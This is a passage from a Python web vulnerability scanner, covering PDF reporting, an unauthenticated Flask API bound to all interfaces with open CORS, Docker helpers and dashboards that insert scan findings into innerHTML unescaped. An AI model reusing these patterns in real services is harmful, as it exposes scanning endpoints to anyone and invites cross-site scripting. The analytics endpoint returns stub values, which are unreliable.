                ["CRITICAL", str(summary.get('critical', 0)), "Critical"],
                ["HIGH", str(summary.get('high', 0)), "High"],
                ["MEDIUM", str(summary.get('medium', 0)), "Medium"],
                ["LOW", str(summary.get('low', 0)), "Low"]
            ]
            
            risk_table = Table(risk_data, colWidths=[2*inch, 1.5*inch, 2*inch])
            risk_table.setStyle(TableStyle([
                ('BACKGROUND', (0, 0), (-1, 0), colors.grey),
                ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),
                ('ALIGN', (0, 0), (-1, -1), 'CENTER'),
                ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
                ('FONTSIZE', (0, 0), (-1, 0), 12),
                ('BOTTOMPADDING', (0, 0), (-1, 0), 12),
                ('GRID', (0, 0), (-1, -1), 1, colors.black)
            ]))
            story.append(risk_table)
            story.append(Spacer(1, 0.2*inch))
            
            # Top Vulnerabilities
            vulns = self.results.get('vulnerabilities', [])
            if vulns:
                story.append(PageBreak())
                story.append(Paragraph("Detailed Findings", styles['Heading2']))
                
                for i, vuln in enumerate(vulns[:15], 1):
                    # Risk color
                    risk_color = colors.red if vuln['risk'] == 'CRITICAL' else colors.orangered if vuln['risk'] == 'HIGH' else colors.orange
                    
                    vuln_title = f"{i}. {vuln['type']} - {vuln['risk']} Risk"
                    story.append(Paragraph(vuln_title, styles['Heading3']))
                    
                    details = [
                        ["Parameter:", vuln['parameter']],
                        ["Risk Score:", f"{vuln['score']}/10"],
                        ["Confidence:", f"{vuln.get('confidence', 50)}%"],
                        ["Payload:", vuln['payload'][:80] + "..." if len(vuln['payload']) > 80 else vuln['payload']],
                        ["Findings:", "<br/>".join(vuln['findings'][:3])]
                    ]
                    
                    detail_table = Table(details, colWidths=[1.5*inch, 4.5*inch])
                    detail_table.setStyle(TableStyle([
                        ('BACKGROUND', (0, 0), (0, -1), colors.lightgrey),
                        ('GRID', (0, 0), (-1, -1), 0.5, colors.grey),
                        ('VALIGN', (0, 0), (-1, -1), 'TOP')
                    ]))
                    story.append(detail_table)
                    story.append(Spacer(1, 0.1*inch))
            
            # Recommendations
            story.append(PageBreak())
            story.append(Paragraph("Remediation Recommendations", styles['Heading2']))
            
            recommendations = [
                "1. Immediately address all CRITICAL and HIGH risk findings",
                "2. Implement input validation and output encoding for all user inputs",
                "3. Deploy a Web Application Firewall (WAF) with custom rules",
                "4. Conduct regular security assessments and penetration testing",
                "5. Implement proper error handling to prevent information leakage",
                "6. Apply security patches and updates promptly",
                "7. Review and harden authentication mechanisms",
                "8. Implement Content Security Policy (CSP) headers"
            ]
            
            for rec in recommendations:
                story.append(Paragraph(rec, styles['Normal']))
                story.append(Spacer(1, 0.05*inch))
            
            doc.build(story)
            print(f"[+] PDF Report generated: {filename}")
            return filename
            
        except Exception as e:
            print(f"[!] PDF error: {e}")
            return None

# ==============================
# API SERVER
# ==============================
class APIServer:
    """RESTful API server for automation"""
    
    def __init__(self, config: ScannerConfig):
        self.config = config
        self.app = None
        self.scan_queue = queue.Queue()
        self.results_store = {}
        
    def start(self, host: str = '0.0.0.0', port: int = 5000):
        """Start API server"""
        if not FLASK_AVAILABLE:
            print("[!] Flask not available for API server")
            return
        
        self.app = Flask(__name__)
        CORS(self.app)
        self.setup_routes()
        
        print(f"[+] API Server starting on http://{host}:{port}")
        print(f"[+] API Endpoints:")
        print(f"    POST /api/v1/scan - Start new scan")
        print(f"    GET  /api/v1/scan/<id> - Get scan results")
        print(f"    GET  /api/v1/scan/<id>/status - Get scan status")
        print(f"    GET  /api/v1/report/<id>/pdf - Download PDF report")
        print(f"    GET  /api/v1/analytics - Get analytics")
        
        self.app.run(host=host, port=port, debug=False, threaded=True)
    
    def setup_routes(self):
        """Setup API routes"""
        
        @self.app.route('/api/v1/scan', methods=['POST'])
        def start_scan():
            data = request.json
            target_url = data.get('url')
            
            if not target_url:
                return jsonify({"error": "URL required"}), 400
            
            scan_id = hashlib.md5(f"{target_url}{time.time()}".encode()).hexdigest()
            
            # Start scan in background
            thread = threading.Thread(target=self._run_scan, args=(scan_id, target_url))
            thread.start()
            
            return jsonify({
                "scan_id": scan_id,
                "status": "started",
                "message": "Scan started successfully"
            })
        
        @self.app.route('/api/v1/scan/<scan_id>', methods=['GET'])
        def get_scan_results(scan_id):
            if scan_id not in self.results_store:
                return jsonify({"error": "Scan not found"}), 404
            
            return jsonify(self.results_store[scan_id])
        
        @self.app.route('/api/v1/scan/<scan_id>/status', methods=['GET'])
        def get_scan_status(scan_id):
            if scan_id not in self.results_store:
                return jsonify({"error": "Scan not found"}), 404
            
            return jsonify({
                "scan_id": scan_id,
                "status": self.results_store[scan_id].get('status', 'unknown'),
                "progress": self.results_store[scan_id].get('progress', 0)
            })
        
        @self.app.route('/api/v1/report/<scan_id>/pdf', methods=['GET'])
        def download_pdf(scan_id):
            if scan_id not in self.results_store:
                return jsonify({"error": "Scan not found"}), 404
            
            results = self.results_store[scan_id].get('results')
            if not results:
                return jsonify({"error": "Results not ready"}), 400
            
            reporter = AdvancedPDFReporter(results, self.config)
            pdf_file = reporter.generate(f"api_report_{scan_id}.pdf")
            
            if pdf_file:
                return send_file(pdf_file, as_attachment=True)
            else:
                return jsonify({"error": "PDF generation failed"}), 500
        
        @self.app.route('/api/v1/analytics', methods=['GET'])
        def get_analytics():
            """Get aggregated analytics from database"""
            db = DatabaseManager(self.config.database_path)
            # Return analytics data
            return jsonify({
                "total_scans": len(self.results_store),
                "average_risk_score": 0,
                "top_vulnerabilities": []
            })
        
        @self.app.route('/api/v1/health', methods=['GET'])
        def health_check():
            return jsonify({"status": "healthy", "timestamp": datetime.now().isoformat()})
    
    def _run_scan(self, scan_id: str, target_url: str):
        """Run scan in background thread"""
        self.results_store[scan_id] = {"status": "running", "progress": 0}
        
        try:
            # Crawl
            self.results_store[scan_id]["progress"] = 10
            crawler = AdvancedWebCrawler(target_url, self.config)
            endpoints = crawler.crawl()
            
            self.results_store[scan_id]["progress"] = 30
            
            # Scan
            scanner = UltimateScanner(target_url, self.config)
            results = scanner.scan(endpoints)
            
            self.results_store[scan_id]["progress"] = 100
            self.results_store[scan_id]["status"] = "completed"
            self.results_store[scan_id]["results"] = results
            
            # Save to database
            db = DatabaseManager(self.config.database_path)
            db.save_scan(results)
            
        except Exception as e:
            self.results_store[scan_id]["status"] = "failed"
            self.results_store[scan_id]["error"] = str(e)

# ==============================
# DOCKER DEPLOYMENT
# ==============================
class DockerDeployer:
    """Docker container management for scanner deployment"""
    
    def __init__(self):
        self.docker_client = None
        if DOCKER_AVAILABLE:
            try:
                self.docker_client = docker.from_env()
            except:
                self.docker_client = None
    
    def build_image(self, image_name: str = "zero-day-scanner:latest") -> bool:
        """Build Docker image"""
        if not self.docker_client:
            print("[!] Docker not available")
            return False
        
        dockerfile = """
FROM python:3.9-slim

WORKDIR /app

COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

COPY . .

EXPOSE 5000 8000

CMD ["python", "zeroday_scanner_ultimate.py"]
"""
        
        requirements = """
requests>=2.28.0
beautifulsoup4>=4.11.0
flask>=2.2.0
flask-cors>=3.0.0
reportlab>=3.6.0
numpy>=1.21.0
scikit-learn>=1.0.0
docker>=6.0.0
"""
        
        with open("Dockerfile", "w") as f:
            f.write(dockerfile)
        with open("requirements.txt", "w") as f:
            f.write(requirements)
        
        print(f"[+] Building Docker image: {image_name}")
        self.docker_client.images.build(path=".", tag=image_name)
        return True
    
    def run_container(self, image_name: str = "zero-day-scanner:latest", 
                      port_mapping: Dict = None) -> Optional[str]:
        """Run scanner in Docker container"""
        if not self.docker_client:
            print("[!] Docker not available")
            return None
        
        if port_mapping is None:
            port_mapping = {'5000/tcp': 5000, '8000/tcp': 8000}
        
        print(f"[+] Starting container from image: {image_name}")
        container = self.docker_client.containers.run(
            image_name,
            detach=True,
            ports=port_mapping,
            remove=True
        )
        
        print(f"[+] Container started: {container.id[:12]}")
        return container.id

# ==============================
# MAIN APPLICATION
# ==============================
class ZeroDayUltimate:
    """Main application orchestrator"""
    
    def __init__(self):
        self.config = ScannerConfig()
        self.db = DatabaseManager(self.config.database_path)
    
    def run_cli(self):
        """Run CLI mode with all features"""
        print_color("\n" + "="*70, Colors.PURPLE)
        print_color("ZERO-DAY SCANNER ULTIMATE - ENTERPRISE EDITION", Colors.BOLD + Colors.PURPLE)
        print_color("Phase 3: AI-Powered | Distributed | API-Ready", Colors.CYAN)
        print_color("="*70, Colors.PURPLE)
        
        target = input("\nEnter target URL: ").strip()
        if not target:
            print_color("[!] URL required", Colors.RED)
            return
        
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        
        # Configure scan
        print_color("\n[+] Scan Configuration:", Colors.CYAN)
        print(f"    AI Detection: {'Enabled' if self.config.enable_ai else 'Disabled'}")
        print(f"    Max Depth: {self.config.max_crawl_depth}")
        print(f"    Max Pages: {self.config.max_crawl_pages}")
        print(f"    Threads: {self.config.max_threads}")
        
        # Crawl
        print_color("\n[*] Phase 1: Intelligent Crawling...", Colors.CYAN)
        crawler = AdvancedWebCrawler(target, self.config)
        endpoints = crawler.crawl()
        
        if not endpoints:
            print_color("[!] No endpoints found, using default", Colors.YELLOW)
            endpoints = [{"url": target, "params": ["id", "q", "page", "search"]}]
        
        # Scan
        print_color("\n[*] Phase 2: AI-Powered Scanning...", Colors.CYAN)
        scanner = UltimateScanner(target, self.config)
        results = scanner.scan(endpoints)
        
        # Save to database
        self.db.save_scan(results)
        
        # Display results
        self._display_results(results)
        
        # Generate report
        gen_pdf = input("\nGenerate PDF report? (y/n): ").lower()
        if gen_pdf == 'y':
            reporter = AdvancedPDFReporter(results, self.config)
            reporter.generate()
        
        print_color("\n[+] Scan complete!", Colors.GREEN)
    
    def _display_results(self, results: Dict):
        """Display scan results"""
        summary = results['summary']
        analytics = results.get('analytics', {})
        
        print_color("\n" + "="*70, Colors.PURPLE)
        print_color("SCAN RESULTS", Colors.BOLD + Colors.PURPLE)
        print_color("="*70, Colors.PURPLE)
        
        print_color(f"\n📊 Statistics:", Colors.BOLD)
        print_color(f"   Total tests: {results['total_tests']}", Colors.WHITE)
        print_color(f"   Total risk score: {summary['total_score']:.1f}", Colors.WHITE)
        print_color(f"   Average score: {analytics.get('avg_score', 0):.1f}/10", Colors.WHITE)
        
        print_color(f"\n🚨 Risk Breakdown:", Colors.BOLD)
        print_color(f"   CRITICAL: {summary['critical']}", Colors.RED)
        print_color(f"   HIGH: {summary['high']}", Colors.RED)
        print_color(f"   MEDIUM: {summary['medium']}", Colors.YELLOW)
        print_color(f"   LOW: {summary['low']}", Colors.GREEN)
        
        if results['vulnerabilities']:
            print_color(f"\n🔍 Top Vulnerabilities:", Colors.BOLD)
            for vuln in results['vulnerabilities'][:10]:
                color = Colors.RED if vuln['score'] >= 7 else Colors.YELLOW if vuln['score'] >= 4 else Colors.BLUE
                print_color(f"   [{vuln['risk']}] {vuln['type']} on '{vuln['parameter']}' (Score: {vuln['score']}/10)", color)
    
    def run_web(self):
        """Run web dashboard"""
        if not FLASK_AVAILABLE:
            print_color("[!] Flask not available, falling back to simple web mode", Colors.YELLOW)
            self.run_simple_web()
            return
        
        print_color("\n[+] Starting Web Dashboard...", Colors.GREEN)
        print_color("[+] Access at: http://localhost:5000", Colors.CYAN)
        print_color("[+] Press Ctrl+C to stop\n", Colors.YELLOW)
        
        app = Flask(__name__)
        CORS(app)
        
        # HTML template embedded
        HTML_TEMPLATE = self._get_web_template()
        
        @app.route('/')
        def index():
            return render_template_string(HTML_TEMPLATE)
        
        @app.route('/api/scan', methods=['POST'])
        def api_scan():
            data = request.json
            target = data.get('url')
            depth = data.get('depth', 2)
            
            if not target:
                return jsonify({"error": "URL required"}), 400
            
            # Run scan in background
            def run_scan():
                config = ScannerConfig(max_crawl_depth=depth, max_crawl_pages=20)
                crawler = AdvancedWebCrawler(target, config)
                endpoints = crawler.crawl()
                scanner = UltimateScanner(target, config)
                results = scanner.scan(endpoints)
                return results
            
            try:
                results = run_scan()
                return jsonify(results)
            except Exception as e:
                return jsonify({"error": str(e)}), 500
        
        webbrowser.open("http://localhost:5000")
        app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
    
    def run_simple_web(self):
        """Simple web server fallback"""
        try:
            from http.server import HTTPServer, BaseHTTPRequestHandler
            
            HTML = '''<!DOCTYPE html>
<html>
<head><title>Zero-Day Scanner Ultimate</title>
<style>
body { font-family: Arial, sans-serif; margin: 40px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); }
.container { max-width: 900px; margin: auto; background: white; padding: 30px; border-radius: 10px; }
h1 { color: #333; }
button { background: #667eea; color: white; padding: 12px 24px; border: none; border-radius: 5px; cursor: pointer; }
pre { background: #f4f4f4; padding: 10px; overflow-x: auto; }
</style>
</head>
<body>
<div class="container">
<h1>🛡️ Zero-Day Scanner Ultimate</h1>
<p>Phase 3: AI-Powered Enterprise Scanner</p>
<input type="text" id="url" placeholder="http://testphp.vulnweb.com" style="width:100%; padding:10px; margin:10px 0;">
<button onclick="startScan()">Start Scan</button>
<div id="results" style="margin-top:20px;"></div>
</div>
<script>
async function startScan() {
    const url = document.getElementById('url').value;
    if(!url) return;
    document.getElementById('results').innerHTML = '<div>Scanning... This may take a few minutes...</div>';
    try {
        const response = await fetch('/scan', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({url: url})
        });
        const data = await response.json();
        document.getElementById('results').innerHTML = '<pre>' + JSON.stringify(data, null, 2) + '</pre>';
    } catch(e) {
        document.getElementById('results').innerHTML = '<div style="color:red">Error: ' + e.message + '</div>';
    }
}
</script>
</body>
</html>'''
            
            class Handler(BaseHTTPRequestHandler):
                def do_GET(self):
                    self.send_response(200)
                    self.send_header('Content-type', 'text/html')
                    self.end_headers()
                    self.wfile.write(HTML.encode())
                
                def do_POST(self):
                    length = int(self.headers['Content-Length'])
                    data = json.loads(self.rfile.read(length))
                    target = data.get('url')
                    
                    config = ScannerConfig(max_crawl_depth=1, max_crawl_pages=10)
                    crawler = AdvancedWebCrawler(target, config)
                    endpoints = crawler.crawl()
                    scanner = UltimateScanner(target, config)
                    results = scanner.scan(endpoints)
                    
                    self.send_response(200)
                    self.send_header('Content-type', 'application/json')
                    self.end_headers()
                    self.wfile.write(json.dumps(results).encode())
            
            print_color("[+] Starting web server at http://localhost:8000", Colors.GREEN)
            server = HTTPServer(('localhost', 8000), Handler)
            webbrowser.open("http://localhost:8000")
            server.serve_forever()
        except Exception as e:
            print_color(f"[!] Web mode error: {e}", Colors.RED)
            self.run_cli()
    
    def run_api(self):
        """Run API server mode"""
        print_color("\n[+] Starting API Server...", Colors.GREEN)
        api_server = APIServer(self.config)
        api_server.start()
    
    def run_distributed(self):
        """Run distributed scanning mode"""
        print_color("\n[+] Starting Distributed Scanner...", Colors.CYAN)
        print_color("[!] Distributed mode requires multiple nodes", Colors.YELLOW)
        
        # Register nodes
        nodes = [
            ScanNode("node1", "localhost", 8001),
            ScanNode("node2", "localhost", 8002),
        ]
        
        distributor = DistributedScanner(self.config)
        for node in nodes:
            distributor.register_node(node)
        
        target = input("Enter target URL: ").strip()
        if target:
            crawler = AdvancedWebCrawler(target, self.config)
            endpoints = crawler.crawl()
            results = distributor.distribute_scan(endpoints)
            print(json.dumps(results, indent=2))
    
    def _get_web_template(self) -> str:
        """Get advanced web dashboard template"""
        return '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Zero-Day Scanner Ultimate</title>
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; }
        .container { max-width: 1400px; margin: 0 auto; padding: 20px; }
        .card { background: white; border-radius: 10px; padding: 20px; margin-bottom: 20px; box-shadow: 0 10px 40px rgba(0,0,0,0.1); }
        h1 { color: #333; margin-bottom: 10px; }
        input, select { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; }
        button { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 12px 24px; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; font-weight: 600; }
        button:hover { transform: translateY(-2px); }
        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin: 20px 0; }
        .stat-card { background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%); border-radius: 10px; padding: 20px; text-align: center; }
        .stat-value { font-size: 32px; font-weight: bold; margin: 10px 0; }
        .risk-critical { color: #dc3545; }
        .risk-high { color: #fd7e14; }
        .risk-medium { color: #ffc107; }
        .risk-low { color: #28a745; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #ddd; }
        th { background: #f5f5f5; }
        .loader { display: none; text-align: center; margin: 20px; }
        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #667eea; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <h1>🛡️ Zero-Day Scanner Ultimate</h1>
            <p>Phase 3: AI-Powered Enterprise Scanner | Distributed | API-Ready</p>
        </div>
        
        <div class="card">
            <h2>🚀 New Scan</h2>
            <input type="text" id="targetUrl" placeholder="http://testphp.vulnweb.com">
            <select id="depth">
                <option value="1">Shallow Crawl (1 level)</option>
                <option value="2" selected>Standard Crawl (2 levels)</option>
                <option value="3">Deep Crawl (3 levels)</option>
            </select>
            <button onclick="startScan()">Start Enterprise Scan</button>
            
            <div id="loader" class="loader">
                <div class="spinner"></div>
                <p style="margin-top: 10px;">AI-Powered Scan in Progress...</p>
            </div>
        </div>
        
        <div id="results" style="display:none;">
            <div class="card">
                <h2>📊 Scan Results</h2>
                <div id="stats" class="stats-grid"></div>
                <h3>🔍 Vulnerabilities Detected</h3>
                <div id="vulnTable"></div>
            </div>
        </div>
    </div>
    
    <script>
        async function startScan() {
            const url = document.getElementById('targetUrl').value;
            const depth = document.getElementById('depth').value;
            
            if (!url) { alert('Please enter a URL'); return; }
            
            document.getElementById('loader').style.display = 'block';
            document.getElementById('results').style.display = 'none';
            
            try {
                const response = await fetch('/api/scan', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({url: url, depth: parseInt(depth)})
                });
                
                const data = await response.json();
                displayResults(data);
            } catch (error) {
                alert('Error: ' + error.message);
            } finally {
                document.getElementById('loader').style.display = 'none';
            }
        }
        
        function displayResults(data) {
            document.getElementById('results').style.display = 'block';
            
            const summary = data.summary;
            const statsHtml = `
                <div class="stat-card"><div class="stat-label">CRITICAL</div><div class="stat-value risk-critical">${summary.critical}</div></div>
                <div class="stat-card"><div class="stat-label">HIGH</div><div class="stat-value risk-high">${summary.high}</div></div>
                <div class="stat-card"><div class="stat-label">MEDIUM</div><div class="stat-value risk-medium">${summary.medium}</div></div>
                <div class="stat-card"><div class="stat-label">LOW</div><div class="stat-value risk-low">${summary.low}</div></div>
                <div class="stat-card"><div class="stat-label">Total Score</div><div class="stat-value">${summary.total_score}</div></div>
                <div class="stat-card"><div class="stat-label">Tests</div><div class="stat-value">${data.total_tests}</div></div>
            `;
            document.getElementById('stats').innerHTML = statsHtml;
            
            if (data.vulnerabilities && data.vulnerabilities.length > 0) {
                let tableHtml = '<table><tr><th>Type</th><th>Parameter</th><th>Risk</th><th>Score</th><th>Findings</th></tr>';
                for (const vuln of data.vulnerabilities.slice(0, 20)) {
                    tableHtml += `<tr>
                        <td>${vuln.type}</td>
                        <td>${vuln.parameter}</td>
                        <td class="risk-${vuln.risk.toLowerCase()}">${vuln.risk}</td>
                        <td>${vuln.score}/10</td>
                        <td>${vuln.findings.slice(0, 2).join('<br>')}</td>
                    </tr>`;
                }
                tableHtml += '</table>';
                document.getElementById('vulnTable').innerHTML = tableHtml;
            } else {
                document.getElementById('vulnTable').innerHTML = '<p style="text-align:center;padding:20px;">No vulnerabilities detected! 🎉</p>';
            }
        }
    </script>
</body>
</html>
        '''

# ==============================
# COLOR OUTPUT FUNCTION
# ==============================
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    RESET = '\033[0m'

def print_color(text, color=Colors.RESET):
    print(f"{color}{text}{Colors.RESET}")

# ==============================
# MAIN ENTRY POINT
# ==============================
def main():
    print_color("""
╔═══════════════════════════════════════════════════════════════════════╗
║     Zero-Day & Detection Tool - Phase 3 ULTIMATE                      ║
║              AI-Powered Enterprise Scanner                            ║
║         Distributed | API-Ready | Docker-Ready | Advanced Analytics   ║
║           Author: Abhishek Rampariya                                  ║
╚═══════════════════════════════════════════════════════════════════════╝
    """, Colors.PURPLE)
    
    print("Select Mode:")
    print("  1. CLI Mode (Command Line - Full Features)")
    print("  2. Web Dashboard (Browser Interface)")
    print("  3. API Server (RESTful API for Automation)")
    print("  4. Distributed Mode (Multi-Node Scanning)")
    print("  5. Docker Deployment (Containerized)")
    
    choice = input("\nEnter choice (1-5): ").strip()
    
    app = ZeroDayUltimate()
    
    if choice == '2':
        app.run_web()
    elif choice == '3':
        app.run_api()
    elif choice == '4':
        app.run_distributed()
    elif choice == '5':
        deployer = DockerDeployer()
        deployer.build_image()
        deployer.run_container()
    else:
        app.run_cli()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print_color("\n\n[!] Interrupted by user", Colors.YELLOW)
    except Exception as e:
        print_color(f"\n[!] Fatal error: {e}", Colors.RED)
        import traceback
        traceback.print_exc()